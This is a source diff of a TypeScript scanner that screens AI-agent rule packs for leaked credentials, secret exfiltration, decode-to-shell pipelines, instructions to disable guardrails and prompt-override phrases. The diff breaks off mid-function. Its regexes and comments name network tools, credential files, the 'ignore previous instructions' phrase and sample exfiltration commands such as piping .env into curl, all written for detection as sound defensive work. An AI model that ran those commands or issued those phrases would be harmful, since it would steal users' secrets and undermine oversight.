@@ -1,4 +1,5 @@
-import { readdirSync, readFileSync, statSync } from 'node:fs';
+import { isUtf8 } from 'node:buffer';
+import { readdirSync, readFileSync } from 'node:fs';
 import { join, relative, sep } from 'node:path';
 
 /**
@@ -13,7 +14,11 @@ import { join, relative, sep } from 'node:path';
  * - `block` — high confidence: a real-looking credential, an upload of local secrets to a
  *   network sink, or an instruction to switch off hooks/guardrails/verification. Install aborts.
  * - `warn` — patterns rule packs legitimately quote as BAD examples (`rm -rf`, `curl | sh`,
- *   `--no-verify`, writing `.env`). Reported, never fatal.
+ *   `--no-verify`, writing `.env`), plus block-level patterns found inside a markdown fence
+ *   labelled as a BAD example. Reported, never fatal.
+ *
+ * Calibrated against every pack in the catalog (0 blocks) and a large third-party rules corpus;
+ * see PR #345 for the numbers and the adversarial review that shaped the evasion handling.
  */
 
 export type ScanSeverity = 'block' | 'warn';
@@ -24,7 +29,7 @@ export interface ScanFinding {
   severity: ScanSeverity;
   /** Path relative to the scanned directory, `/`-separated. */
   file: string;
-  /** 1-based line number. */
+  /** 1-based line number; 0 for file-wide findings (decoded JSON value, script-level check). */
   line: number;
   /** Human-readable reason. */
   message: string;
@@ -51,19 +56,65 @@ interface LineRule {
 
 /** Engine-written cache markers and the preserved tarball — not pack content. */
 const SKIPPED_FILE_PREFIX = '.bluetemberg-';
-/** Content larger than this is reported, not regex-scanned (keeps scan time bounded). */
-const MAX_SCANNED_FILE_BYTES = 2 * 1024 * 1024;
-/** Lines longer than this are scanned in their first N chars only (regex cost cap). */
-const MAX_SCANNED_LINE_CHARS = 8 * 1024;
+/** Lines longer than this are matched in overlapping windows so regex cost stays linear. */
+const SCAN_WINDOW_CHARS = 8 * 1024;
+const SCAN_WINDOW_OVERLAP = 512;
 const BINARY_SNIFF_BYTES = 8000;
+/**
+ * Extensions skipped when the file also looks binary. Everything else is scanned as text with
+ * NULs stripped — a NUL byte at the top of `SKILL.md` must not hide the rest of it.
+ */
+const BINARY_EXTENSIONS = new Set([
+  'png',
+  'jpg',
+  'jpeg',
+  'gif',
+  'webp',
+  'ico',
+  'bmp',
+  'avif',
+  'woff',
+  'woff2',
+  'ttf',
+  'otf',
+  'eot',
+  'pdf',
+  'zip',
+  'gz',
+  'tgz',
+  'tar',
+  'wasm',
+  'mp3',
+  'mp4',
+  'mov',
+  'webm',
+  'pack',
+  'idx',
+  'bin',
+  'db',
+  'sqlite',
+  'jar',
+  'class',
+  'so',
+  'dylib',
+  'dll',
+  'exe',
+  'node',
+]);
+/** Code a hook can execute; checked for secret reads and uploads anywhere in the file. */
+const SCRIPT_EXTENSIONS = new Set(['sh', 'bash', 'zsh', 'js', 'mjs', 'cjs', 'ts', 'py', 'ps1', 'rb']);
+/** base64 runs at least this long are decoded and re-scanned. */
+const MIN_BASE64_CHARS = 24;
 const EXCERPT_CHARS = 160;
 /** Shannon entropy (bits/char) below which a credential-shaped token is a placeholder. */
 const MIN_SECRET_ENTROPY = 3.0;
 
-/** Invisible characters an attacker can use to split a keyword past a regex. */
-const INVISIBLE_CHARS = /[­᠎​-‏⁠-⁤﻿]/g;
+/** Invisible characters (and NULs) an attacker can use to split a keyword past a regex. */
+const INVISIBLE_CHARS = /[\u0000\u00AD\u180E\u200B-\u200F\u2060-\u2064\uFEFF]/g;
 /** Bidirectional overrides ("Trojan Source"): render text in a different order than it is read. */
-const BIDI_CONTROL_CHARS = /[‪-‮⁦-⁩]/;
+const BIDI_CONTROL_CHARS = /[\u202A-\u202E\u2066-\u2069]/;
+/** Terminal control sequences and bidi controls, never echoed back in excerpts or paths. */
+const UNPRINTABLE_CHARS = /[\u0000-\u0008\u000B-\u001F\u007F-\u009F\u202A-\u202E\u2066-\u2069]/g;
 
 // ---------------------------------------------------------------------------
 // Credentials
@@ -128,40 +179,145 @@ const KEY_BODY_LINE = /^[A-Za-z0-9+/=]{40,}$/;
 // ---------------------------------------------------------------------------
 
 const NETWORK_SINK = /\b(?:curl|wget|nc|ncat|netcat|socat|Invoke-WebRequest|Invoke-RestMethod|iwr|irm)\b/i;
-const SENSITIVE_SOURCE =
-  /(?:^|[\s"'=@/(<$:])(?:~\/|\$HOME\/)?(?:\.env\b(?!\.example|\.sample|\.template)|\.ssh\/|id_(?:rsa|ed25519|ecdsa)\b|\.aws\/credentials|\.npmrc\b|\.netrc\b|\.pgpass\b|\.git-credentials\b|\.docker\/config\.json|\/etc\/(?:passwd|shadow)\b|\.kube\/config|\bprintenv\b|\benv\s*\||\$\{?[A-Z0-9_]*(?:TOKEN|SECRET|PASSWORD|API_KEY|PRIVATE_KEY)\b)/;
+/** Files whose content is a secret. `.env.example`-style templates are not. */
+const SENSITIVE_PATH =
+  /(?:~\/|\$HOME\/|\$\{HOME\}\/)?(?:\.env\b(?!\.(?:example|sample|template)\b)|\.ssh\/|id_(?:rsa|ed25519|ecdsa)\b|\.aws\/credentials|\.npmrc\b|\.netrc\b|\.pgpass\b|\.git-credentials\b|\.docker\/config\.json|\/etc\/(?:passwd|shadow)\b|\.kube\/config)/;
+const SECRET_VAR = /\$\{?[A-Z0-9_]*(?:TOKEN|SECRET|PASSWORD|API_KEY|PRIVATE_KEY)\b/;
 const UPLOAD_FLAG =
   /(?:\s-[a-zA-Z]*[dFT]\b|--data(?:-binary|-raw|-urlencode)?\b|--form\b|--upload-file\b|--post-(?:file|data)\b|--body-data\b|-InFile\b|-Body\b)/;
-const PIPE_INTO_SINK = /\|\s*(?:sudo\s+)?(?:curl|wget|nc|ncat|netcat|socat)\b/i;
+/** `curl -d @.env`, `-F f=@~/.ssh/id_rsa`, `--upload-file .npmrc`: a secret file as the body. */
+const SECRET_FILE_UPLOAD = new RegExp(
+  `(?:@|(?:--upload-file|-T|--post-file=?|-InFile)\\s*)["']?${SENSITIVE_PATH.source}`,
+);
+/** `nc host 4444 < ~/.ssh/id_rsa`. */
+const SECRET_FILE_REDIRECT = new RegExp(`<\\s*["']?${SENSITIVE_PATH.source}`);
+/** `-d "$(cat .env)"`: a secret file read into the payload by a subshell. */
+const SECRET_FILE_SUBSHELL = new RegExp(
+  `(?:\\$\\(|\`)\\s*(?:cat|base64|head|tail)\\s+["']?${SENSITIVE_PATH.source}`,
+);
+/** `-d "$GITHUB_TOKEN"`, `--post-data "t=$NPM_TOKEN"`: the secret is the body, not the auth. */
+const SECRET_VAR_PAYLOAD = new RegExp(
+  `(?:\\s-d|--data(?:-binary|-raw|-urlencode)?|\\s-F|--form|--post-data|--body-data|-Body)[\\s=]+["']?[^\\s"']{0,200}${SECRET_VAR.source}`,
+);
+/** Auth headers carry a token *to its own API*; that is authentication, not exfiltration. */
+const AUTH_ARGUMENT =
+  /(?:\s-H|--header|\s-u|--user)\s*=?\s*(?:"[^"]*"|'[^']*'|\S+)|\bAuthorization\b\s*[:=]\s*(?:"[^"]*"|'[^']*'|`[^`]*`|[^,}\n]*)/gi;
+const READER_STAGE = /\b(?:cat|base64|tar|gzip|xxd|head|tail|zip|openssl|type|Get-Content|gc)\b/i;
+const ENV_DUMP_STAGE = /^\s*(?:printenv|env|set|export\s+-p)\s*$/;
+const SECRET_ECHO_STAGE = new RegExp(`^\\s*(?:echo|printf)\\b.*${SECRET_VAR.source}`);
+const SINK_STAGE = /^\s*(?:sudo\s+)?(?:curl|wget|nc|ncat|netcat|socat)\b/i;
 const LOCAL_TARGET_ONLY = /(?:localhost|127\.0\.0\.1|\[::1\]|0\.0\.0\.0)/;
 const EXTERNAL_URL = /\bhttps?:\/\/(?!localhost\b|127\.0\.0\.1\b|\[::1\])[^\s"'`)]+/i;
 
-/** A command that moves local secrets into a network client pointed somewhere external. */
-export function isExfiltration(line: string): boolean {
+/** HTTP clients called from code (hook scripts in JS/Python/PowerShell). */
+const PROGRAMMATIC_SINK =
+  /\b(?:fetch|axios(?:\.\w+)?|got(?:\.\w+)?|requests\.(?:post|put|patch|request)|urlopen|https?\.request|sendBeacon)\s*\(|\bnew\s+XMLHttpRequest\b/;
+/** A secret file read in code: `readFileSync('.env')`, `open(expanduser('~/.aws/credentials'))`. */
+const PROGRAMMATIC_SECRET_READ = new RegExp(
+  `\\b(?:readFileSync|readFile|open|read_text|Get-Content)\\s*\\([^)]{0,200}?${SENSITIVE_PATH.source}`,
+);
+/** The whole environment serialised — always secrets-bearing when sent anywhere. */
+const WHOLE_ENVIRONMENT =
+  /JSON\.stringify\(\s*process\.env\s*\)|\bdict\(\s*os\.environ\s*\)|\bos\.environ\.copy\(\)/;
+
+type StageTest = { test: (stage: string) => boolean };
+
+/**
+ * True when a pipeline stage matching `producer` feeds straight into one matching `consumer`.
+ * Splitting on `|` keeps this linear — a `[^|]*\|` regex backtracks quadratically on
+ * `curl curl curl…`. `||` yields an empty stage, so `curl x || sh` is (correctly) not a pipe.
+ */
+function pipesInto(line: string, producer: StageTest, consumer: StageTest): boolean {
+  if (!line.includes('|')) return false;
+  const stages = line.split('|');
+  for (let i = 1; i < stages.length; i++) {
+    if (consumer.test(stages[i]) && producer.test(stages[i - 1])) return true;
+  }
+  return false;
+}
+
+const SECRET_PRODUCER: StageTest = {
+  test: (stage) =>
+    (READER_STAGE.test(stage) && SENSITIVE_PATH.test(stage)) ||
+    ENV_DUMP_STAGE.test(stage) ||
+    SECRET_ECHO_STAGE.test(stage),
+};
+
+function targetsExternalHost(line: string): boolean {
+  return !LOCAL_TARGET_ONLY.test(line) || EXTERNAL_URL.test(line);
+}
+
+function isProgrammaticExfiltration(line: string): boolean {
+  if (!PROGRAMMATIC_SINK.test(line) || !EXTERNAL_URL.test(line)) return false;
+  return PROGRAMMATIC_SECRET_READ.test(line) || WHOLE_ENVIRONMENT.test(line);
+}
+
+function isCliExfiltration(line: string): boolean {
   if (!NETWORK_SINK.test(line)) return false;
-  if (!SENSITIVE_SOURCE.test(line)) return false;
-  if (!UPLOAD_FLAG.test(line) && !PIPE_INTO_SINK.test(line)) return false;
-  if (LOCAL_TARGET_ONLY.test(line) && !EXTERNAL_URL.test(line)) return false;
-  return true;
+  if (SECRET_FILE_UPLOAD.test(line) || SECRET_FILE_REDIRECT.test(line) || SECRET_VAR_PAYLOAD.test(line))
+    return true;
+  if (SECRET_FILE_SUBSHELL.test(line) && UPLOAD_FLAG.test(line)) return true;
+  return pipesInto(line, SECRET_PRODUCER, SINK_STAGE);
+}
+
+/**
+ * A command that puts local secrets in the body of a request to a non-local host. A token in
+ * an `Authorization`/`-H`/`-u` argument is stripped first: that is the token's normal use.
+ */
+export function isExfiltration(rawLine: string): boolean {
+  const line = rawLine.replace(AUTH_ARGUMENT, ' ');
+  if (!targetsExternalHost(line)) return false;
+  return isProgrammaticExfiltration(line) || isCliExfiltration(line);
+}
+
+/** Decoding an opaque blob straight into a shell: obfuscation with no legitimate rule-pack use. */
+const DECODER_COMMAND = /\b(?:base64\s+(?:-d|-D|--decode)|xxd\s+-r)\b/i;
+const OPENSSL_CODEC = /\bopenssl\s+(?:base64|enc)\b/i;
+const DECODE_FLAG = /\s-d\b/;
+const DECODER = {
+  test: (stage: string): boolean =>
+    DECODER_COMMAND.test(stage) || (OPENSSL_CODEC.test(stage) && DECODE_FLAG.test(stage)),
+};
+const DOWNLOADER = /\b(?:curl|wget|iwr|irm|Invoke-WebRequest)\b/i;
+const SHELL_STAGE = /^\s*(?:sudo\s+)?(?:(?:ba|z|da|k)?sh|iex|Invoke-Expression)\b/i;
+
+/** A pipeline stage matching `producer` feeds straight into a shell. */
+export function pipesIntoShell(line: string, producer: StageTest): boolean {
+  return pipesInto(line, producer, SHELL_STAGE);
+}
+
+/** File-wide: a script that both reads secrets and uploads somewhere (possibly on different lines). */
+export function scriptReadsSecretsAndUploads(rawText: string): boolean {
+  const text = rawText.replace(AUTH_ARGUMENT, ' ');
+  if (!SENSITIVE_PATH.test(text) && !WHOLE_ENVIRONMENT.test(text)) return false;
+  if (!EXTERNAL_URL.test(text)) return false;
+  return PROGRAMMATIC_SINK.test(text) || (NETWORK_SINK.test(text) && UPLOAD_FLAG.test(text));
 }
 
 // ---------------------------------------------------------------------------
 // Instructions to switch off safety controls
 // ---------------------------------------------------------------------------
 
-const DISABLE_VERB =
-  /\b(?:disable|turn(?:ing)?\s+off|bypass|circumvent|deactivate|remove|delete|uninstall|skip|ignore)\b/gi;
+/** No remove/delete/uninstall: "remove husky" is a routine hook-manager migration step. */
+const DISABLE_VERB = /\b(?:disable|turn(?:ing)?\s+off|bypass|circumvent|deactivate|skip|ignore)\b/gi;
 const SAFETY_CONTROL =
-  /\b(?:guardrails?|(?:pre-?commit|git|claude|cursor|security|PreToolUse|PostToolUse)\s+hooks?|hooks?\s+(?:entirely|completely)|husky|signature\s+verification|integrity\s+checks?|security\s+(?:scan(?:ner|ning)?|checks?|tools?)|bluetemberg\s+(?:scan|guardrails?|verify))\b/i;
+  /\b(?:guardrails?|(?:pre-?commit|git|claude|cursor|security|PreToolUse|PostToolUse)\s+hooks?|hooks?\s+(?:entirely|completely)|signature\s+verification|integrity\s+checks?|security\s+(?:scan(?:ner|ning)?|checks?|tools?)|bluetemberg\s+(?:scan|guardrails?|verify))\b/i;
 /** Words that turn "disable the hooks" into "never disable the hooks". */
 const NEGATION =
   /\b(?:never|don'?t|do\s+not|does\s+not|must\s+not|mustn'?t|should\s+not|shouldn'?t|cannot|can'?t|won'?t|no\s+(?:way|one)|avoid|refuse|forbid(?:den)?|prohibit(?:ed)?|prevent|block(?:s|ed)?|without|instead\s+of|rather\s+than|not\s+allowed|unless)\b/i;
 /** Agent-CLI flags that remove every permission prompt / sandbox. */
 const DANGEROUS_AGENT_FLAG =
   /(?:^|\s)--(?:dangerously-skip-permissions|dangerously-bypass-approvals-and-sandbox|yolo)\b/i;
-/** The classic prompt-injection opener. */
+/** The classic prompt-injection openers. */
 const OVERRIDE_PHRASE =
-  /\b(?:ignore|disregard|forget)\s+(?:all\s+)?(?:of\s+)?(?:the\s+|your\s+)?(?:previous|prior|above|earlier|preceding|system)\s+(?:instructions|rules|guidance|prompts?)\b/i;
+  /\b(?:ignore|disregard|forget)\s+(?:(?:all\s+)?(?:of\s+)?(?:the\s+|your\s+)?(?:previous|prior|above|earlier|preceding|system)\s+(?:instructions|rules|guidance|prompts?|messages)|(?:everything|anything|all)\s+(?:above|before|prior|previously\s+(?:said|stated)))\b/i;
+/** Phrases that contain a negation word but are not negations ("don't hesitate to disable…"). */
+const FALSE_NEGATION =
+  /\b(?:(?:don'?t|do\s+not)\s+hesitate\s+to|never\s+mind|no\s+need\s+to\s+(?:ask|worry|check))\b/gi;
+
+function isNegated(lead: string): boolean {
+  return NEGATION.test(lead.replace(FALSE_NEGATION, ' '));
+}
 /** A quoted span: the phrase is being cited ("watch for 'ignore previous instructions'"), not issued. */
 const QUOTED_SPAN = /"[^"]*"|'[^']*'|`[^`]*`|\u201C[^\u201D]*\u201D/g;
 /** Mentions of switches that weaken this engine's or the agent's checks — legitimate in docs. */
@@ -175,14 +331,14 @@ function withoutQuotedSpans(line: string): string {
 export function usesDangerousAgentFlag(line: string): boolean {
   const match = DANGEROUS_AGENT_FLAG.exec(line);
   if (!match) return false;
-  return !NEGATION.test(line.slice(0, match.index));
+  return !isNegated(line.slice(0, match.index));
 }
 
 /** "Ignore previous instructions" issued, not quoted or warned about. */
 export function isPromptOverride(line: string): boolean {
   const match = OVERRIDE_PHRASE.exec(withoutQuotedSpans(line));
   if (!match) return false;
-  return !NEGATION.test(line.slice(0, match.index));
+  return !isNegated(line.slice(0, match.index));
 }
 
 /**
@@ -191,13 +347,21 @@ export function isPromptOverride(line: string): boolean {
  * guardrails" (descriptive, subject first) does not qualify; "Then bypass the guardrails" does.
  */
 const IMPERATIVE_LEAD_IN =
-  /^[\s\-*>#\d.)`"'(]*(?:(?:please|then|first|next|now|always|just|and|also|simply|finally|step\s+\d+:?|you\s+(?:should|must|can|may|need\s+to|have\s+to|will\s+need\s+to)|make\s+sure\s+(?:to|you)|be\s+sure\s+to|remember\s+to|feel\s+free\s+to|go\s+ahead\s+and|it\s+is\s+(?:fine|ok|okay|safe)\s+to)[\s,:]+)*$/i;
+  /^[\s\-*>#\d.)`"'(]*(?:(?:please|then|first|next|now|always|just|and|also|simply|finally|(?:don'?t|do\s+not)\s+hesitate\s+to|never\s+mind|step\s+\d+:?|you\s+(?:should|must|can|may|need\s+to|have\s+to|will\s+need\s+to)|make\s+sure\s+(?:to|you)|be\s+sure\s+to|remember\s+to|feel\s+free\s+to|go\s+ahead\s+and|it\s+is\s+(?:fine|ok|okay|safe)\s+to)[\s,:]+)*$/i;
 const CLAUSE_BOUNDARY = /[.;:!?](?:\s|$)|\s[-–—]\s/g;
+/**
+ * A leading dependent clause ends in a comma before the order: "If CI is slow, skip the hooks".
+ * Plain commas are not boundaries — "to disable, bypass, or remove hooks" is a list.
+ */
+const DEPENDENT_CLAUSE = /^\s*(?:if|when|whenever|before|after|once|while|in\s+case|to)\b[^,]*,\s*/i;
+/** Only the words right before the verb decide its mood; also bounds the lead-in regex input. */
+const MAX_LEAD_CHARS = 120;
 
 function clauseBefore(line: string, index: number): string {
+  const window = line.slice(Math.max(0, index - MAX_LEAD_CHARS), index);
   let start = 0;
-  for (const m of line.slice(0, index).matchAll(CLAUSE_BOUNDARY)) start = m.index + m[0].length;
-  return line.slice(start, index);
+  for (const m of window.matchAll(CLAUSE_BOUNDARY)) start = m.index + m[0].length;
+  return window.slice(start).replace(DEPENDENT_CLAUSE, '');
 }
 
 /** An imperative to switch off hooks/guardrails/verification that is not itself negated. */
@@ -206,7 +370,7 @@ export function isSafetyBypassInstruction(line: string): boolean {
     const after = line.slice(verb.index, verb.index + verb[0].length + 60);
     if (!SAFETY_CONTROL.test(after)) continue;
     const lead = clauseBefore(line, verb.index);
-    if (NEGATION.test(lead)) continue;
+    if (isNegated(lead)) continue;
     if (IMPERATIVE_LEAD_IN.test(lead)) return true;
   }
   return false;
@@ -230,6 +394,12 @@ const LINE_RULES: readonly LineRule[] = [
     severity: 'block',
     message: 'Instructs the agent to disable hooks, guardrails, permissions, or verification',
     test: isSafetyBypassInstruction,
+  },
+  {
+    id: 'decode-to-shell',
+    severity: 'block',
+    message: 'Decodes an opaque blob (base64/hex) straight into a shell',
+    test: (line) => pipesIntoShell(line, DECODER),
   },
   {
     id: 'dangerous-agent-flag',
@@ -257,8 +427,7 @@ const LINE_RULES: readonly LineRule[] = [
     id: 'pipe-to-shell',
     severity: 'warn',
     message: 'Pipes a downloaded script straight into a shell',
-    test: (line) =>
-      /\b(?:curl|wget|iwr|irm)\b[^|\n]*\|\s*(?:sudo\s+)?(?:ba|z|da|k)?sh\b|\|\s*iex\b/i.test(line),
+    test: (line) => pipesIntoShell(line, DOWNLOADER),
   },
   {
     id: 'write-secrets-file',
@@ -296,14 +465,32 @@ function maskSecrets(line: string): string {
   return masked;
 }
 
+/** Escape terminal control sequences so a finding cannot rewrite the user's terminal. */
+export function sanitizeForTerminal(text: string): string {
+  return text.replace(UNPRINTABLE_CHARS, (ch) => `\\u${ch.charCodeAt(0).toString(16).padStart(4, '0')}`);
+}
+
 function toExcerpt(line: string): string {
-  const masked = maskSecrets(line.trim());
+  const masked = sanitizeForTerminal(maskSecrets(line.trim()));
   return masked.length > EXCERPT_CHARS ? `${masked.slice(0, EXCERPT_CHARS)}…` : masked;
 }
 
-/** Strip zero-width/soft-hyphen characters so `rm` + U+200B + ` -rf` still matches. */
+/**
+ * Fold a line to what the matchers expect: NFKC (fullwidth `ｃｕｒｌ` → `curl`), then strip
+ * zero-width characters and NULs so `rm` + U+200B + ` -rf` still matches.
+ */
 export function normalizeForScan(line: string): string {
-  return line.replace(INVISIBLE_CHARS, '').slice(0, MAX_SCANNED_LINE_CHARS);
+  return line.normalize('NFKC').replace(INVISIBLE_CHARS, '');
+}
+
+/** Overlapping windows of a long line; a match straddling a boundary is seen whole in one of them. */
+function windows(line: string): string[] {
+  if (line.length <= SCAN_WINDOW_CHARS) return [line];
+  const out: string[] = [];
+  for (let i = 0; i < line.length; i += SCAN_WINDOW_CHARS - SCAN_WINDOW_OVERLAP) {
+    out.push(line.slice(i, i + SCAN_WINDOW_CHARS));
+  }
+  return out;
 }
 
 function finding(
@@ -315,17 +502,6 @@ function finding(
   raw: string,
 ): ScanFinding {
   return { rule, severity, file, line, message, excerpt: toExcerpt(raw) };
-}
-
-function scanPrivateKeys(lines: readonly string[], file: string): ScanFinding[] {
-  const found: ScanFinding[] = [];
-  lines.forEach((line, i) => {
-    if (!PRIVATE_KEY_HEADER.test(line)) return;
-    const next = (lines[i + 1] ?? '').trim();
-    if (!KEY_BODY_LINE.test(next)) return;
-    found.push(finding('secret-private-key', 'block', 'Embeds a private key', file, i + 1, line));
-  });
-  return found;
 }
 
 /**
@@ -341,34 +517,307 @@ function severityIn(file: string, severity: ScanSeverity, rule: string): ScanSev
   return severity;
 }
 
-function scanLine(raw: string, file: string, lineNo: number): ScanFinding[] {
+/** A unit of text to match, mapped back to the physical lines it came from. */
+interface ScanUnit {
+  text: string;
+  /** First physical line (1-based); 0 when there is no line (decoded JSON value). */
+  line: number;
+  /** Last physical line covered, for deduplicating joined units against single lines. */
+  endLine: number;
+  raw: string;
+  /** Built by joining or decoding, rather than one physical line. */
+  derived?: boolean;
+  /** Restrict to these rule ids (joined prose only feeds instruction rules). */
+  only?: ReadonlySet<string>;
+  /** Appended to the message, e.g. "(inside base64)". */
+  note?: string;
+  /** Inside a code fence (or on a line) labelled as a BAD example. */
+  example?: boolean;
+}
+
+/**
+ * Rule packs quote attacks as BAD examples ("❌ Don't: `cat .env | curl …`"). In markdown, these
+ * rules warn instead of block when the fence or line is labelled that way. Credentials and bidi
+ * controls still block: a real key in an example is still a leaked key. Scripts never downgrade.
+ */
+const EXAMPLE_DOWNGRADE = new Set([
+  'exfiltration',
+  'decode-to-shell',
+  'dangerous-agent-flag',
+  'disable-safety-controls',
+  'prompt-override',
+]);
+const NEGATIVE_LABEL =
+  /\b(?:bad|wrong|incorrect|insecure|unsafe|vulnerable|dangerous|anti-?pattern|don'?t|do\s+not|never|avoid|attack(?:er|s)?|malicious|exfiltrat\w*)\b|❌|🚫|⛔/i;
+/** A line that is itself a BAD example: it *starts* with the label ("- ❌ Never: …", "Bad: …"). */
+const LINE_NEGATIVE_PREFIX =
+  /^[\s\-*>#\d.)]*(?:❌|🚫|⛔|\*\*|_)?\s*(?:bad|wrong|incorrect|insecure|unsafe|anti-?pattern|don'?t|do\s+not|never|avoid)\b|❌|🚫|⛔/i;
+const MARKDOWN_EXTENSIONS = new Set(['md', 'mdc', 'mdx', 'markdown', 'txt']);
+
+function severityFor(unit: ScanUnit, file: string, severity: ScanSeverity, rule: string): ScanSeverity {
+  const base = severityIn(file, severity, rule);
+  if (base === 'block' && unit.example && EXAMPLE_DOWNGRADE.has(rule)) return 'warn';
+  return base;
+}
+
+function matchUnit(unit: ScanUnit, file: string): ScanFinding[] {
   const found: ScanFinding[] = [];
-  if (BIDI_CONTROL_CHARS.test(raw)) {
-    found.push(finding('bidi-control-chars', 'block', BIDI_MESSAGE, file, lineNo, raw));
-  }
-  const line = normalizeForScan(raw);
-  for (const { id, label } of findSecrets(line)) {
-    found.push(finding(id, 'block', `Embeds what looks like a real ${label}`, file, lineNo, raw));
-  }
-  for (const rule of LINE_RULES) {
-    if (!rule.test(line)) continue;
-    found.push(finding(rule.id, severityIn(file, rule.severity, rule.id), rule.message, file, lineNo, raw));
+  const seen = new Set<string>();
+  const push = (rule: string, severity: ScanSeverity, message: string): void => {
+    if (seen.has(rule)) return;
+    seen.add(rule);
+    const effective = severityFor(unit, file, severity, rule);
+    const notes = [unit.note, effective !== severity && unit.example ? '(in a BAD example)' : undefined];
+    const suffix = notes
+      .filter(Boolean)
+      .map((n) => ` ${n}`)
+      .join('');
+    found.push(finding(rule, effective, message + suffix, file, unit.line, unit.raw));
+  };
+  for (const text of windows(unit.text)) {
+    if (!unit.only) {
+      for (const { id, label } of findSecrets(text))
+        push(id, 'block', `Embeds what looks like a real ${label}`);
+    }
+    for (const rule of LINE_RULES) {
+      if (unit.only && !unit.only.has(rule.id)) continue;
+      if (rule.test(text)) push(rule.id, rule.severity, rule.message);
+    }
   }
   return found;
 }
 
-/**
- * Scan one file's text. Exported for tests; `file` is only used to label findings.
- */
-export function scanText(text: string, file: string): ScanFinding[] {
-  const lines = text.split(/\r?\n/);
-  const findings = lines.flatMap((raw, i) => scanLine(raw, file, i + 1));
-  findings.push(...scanPrivateKeys(lines, file));
-  return findings;
+const FENCE = /^\s*(?:```|~~~)/;
+/** Lines that start their own block: list items, headings, quotes, HTML. */
+const BLOCK_START = /^\s*(?:[-*+]\s|\d+[.)]\s|#|>|<)/;
+const TABLE_ROW = /^\s*\|/;
+/** How far above a fence its label ("Bad:", "❌ Don't") may sit. */
+const FENCE_LABEL_LOOKBACK = 3;
+
+function fenceLabel(lines: readonly string[], fenceLine: number): string {
+  const label = [lines[fenceLine]];
+  for (let i = fenceLine - 1; i >= 0 && i >= fenceLine - FENCE_LABEL_LOOKBACK; i--) {
+    if (lines[i].trim() === '') continue;
+    label.push(lines[i]);
+    break;
+  }
+  return label.join(' ');
 }
 
-function isBinary(buffer: Buffer): boolean {
-  return buffer.subarray(0, BINARY_SNIFF_BYTES).includes(0);
+/** Per line: is it a BAD example (inside a negatively-labelled fence, or negated itself)? */
+function exampleLines(lines: readonly string[], file: string): boolean[] {
+  const flags = lines.map(() => false);
+  if (!MARKDOWN_EXTENSIONS.has(extensionOf(file))) return flags;
+  let fenceIsExample: boolean | null = null;
+  lines.forEach((line, i) => {
+    if (FENCE.test(line)) {
+      fenceIsExample = fenceIsExample === null ? NEGATIVE_LABEL.test(fenceLabel(lines, i)) : null;
+      return;
+    }
+    flags[i] = fenceIsExample ?? LINE_NEGATIVE_PREFIX.test(line.replace(FALSE_NEGATION, ' '));
+  });
+  return flags;
+}
+
+/** Shell `\` continuations joined into one command. */
+function continuationUnits(lines: readonly string[]): ScanUnit[] {
+  const units: ScanUnit[] = [];
+  for (let i = 0; i < lines.length; i++) {
+    if (!lines[i].trimEnd().endsWith('\\')) continue;
+    const start = i;
+    const parts: string[] = [];
+    while (i < lines.length && lines[i].trimEnd().endsWith('\\'))
+      parts.push(lines[i++].trimEnd().slice(0, -1));
+    if (i < lines.length) parts.push(lines[i]);
+    const text = parts.join(' ');
+    units.push({
+      text,
+      line: start + 1,
+      endLine: Math.min(i, lines.length - 1) + 1,
+      raw: text,
+      derived: true,
+    });
+  }
+  return units;
+}
+
+/** Hard-wrapped prose paragraphs joined, so "disable the⏎pre-commit hooks" reads as one sentence. */
+function paragraphUnits(lines: readonly string[]): ScanUnit[] {
+  const units: ScanUnit[] = [];
+  let inFence = false;
+  let start = -1;
+  const flush = (end: number): void => {
+    if (start >= 0 && end - start > 1) {
+      const text = lines
+        .slice(start, end)
+        .map((l) => l.trim())
+        .join(' ');
+      units.push({ text, line: start + 1, endLine: end, raw: text, derived: true, only: INSTRUCTION_RULES });
+    }
+    start = -1;
+  };
+  lines.forEach((line, i) => {
+    if (FENCE.test(line)) {
+      flush(i);
+      inFence = !inFence;
+      return;
+    }
+    if (inFence || line.trim() === '' || TABLE_ROW.test(line)) return flush(i);
+    if (BLOCK_START.test(line)) flush(i);
+    if (start < 0) start = i;
+  });
+  flush(lines.length);
+  return units;
+}
+
+const BASE64_RUN = new RegExp(`[A-Za-z0-9+/]{${MIN_BASE64_CHARS},}={0,2}`, 'g');
+/** Decoded text must be overwhelmingly printable to be worth re-scanning (keys/hashes are not). */
+const MOSTLY_PRINTABLE = /^[\x20-\x7E\t\r\n]*$/;
+
+function base64Units(lines: readonly string[]): ScanUnit[] {
+  const units: ScanUnit[] = [];
+  lines.forEach((line, i) => {
+    for (const match of line.matchAll(BASE64_RUN)) {
+      const decoded = Buffer.from(match[0], 'base64').toString('latin1');
+      if (decoded.length < MIN_BASE64_CHARS / 2 || !MOSTLY_PRINTABLE.test(decoded)) continue;
+      const text = normalizeForScan(decoded);
+      units.push({ text, line: i + 1, endLine: i + 1, raw: line, derived: true, note: '(inside base64)' });
+    }
+  });
+  return units;
+}
+
+/** String values of a JSON file, decoded: a `\u`-escaped `curl` in hooks.json still runs `curl`. */
+function jsonStringUnits(text: string): ScanUnit[] {
+  let parsed: unknown;
+  try {
+    parsed = JSON.parse(text);
+  } catch {
+    return [];
+  }
+  const units: ScanUnit[] = [];
+  const walk = (value: unknown): void => {
+    if (typeof value === 'string') {
+      units.push({
+        text: normalizeForScan(value),
+        line: 0,
+        endLine: 0,
+        raw: value,
+        derived: true,
+        note: '(JSON value)',
+      });
+      return;
+    }
+    if (value && typeof value === 'object') Object.values(value).forEach(walk);
+  };
+  walk(parsed);
+  return units;
+}
+
+function scanPrivateKeys(lines: readonly string[], file: string): ScanFinding[] {
+  const found: ScanFinding[] = [];
+  lines.forEach((line, i) => {
+    if (!PRIVATE_KEY_HEADER.test(line)) return;
+    const next = (lines[i + 1] ?? '').trim();
+    if (!KEY_BODY_LINE.test(next)) return;
+    found.push(finding('secret-private-key', 'block', 'Embeds a private key', file, i + 1, line));
+  });
+  return found;
+}
+
+function scanBidi(rawLines: readonly string[], file: string): ScanFinding[] {
+  return rawLines.flatMap((raw, i) =>
+    BIDI_CONTROL_CHARS.test(raw)
+      ? [finding('bidi-control-chars', 'block', BIDI_MESSAGE, file, i + 1, raw)]
+      : [],
+  );
+}
+
+function extensionOf(file: string): string {
+  const base = file.slice(file.lastIndexOf('/') + 1);
+  const dot = base.lastIndexOf('.');
+  return dot > 0 ? base.slice(dot + 1).toLowerCase() : '';
+}
+
+function scriptFinding(text: string, file: string, already: readonly ScanFinding[]): ScanFinding[] {
+  if (!SCRIPT_EXTENSIONS.has(extensionOf(file))) return [];
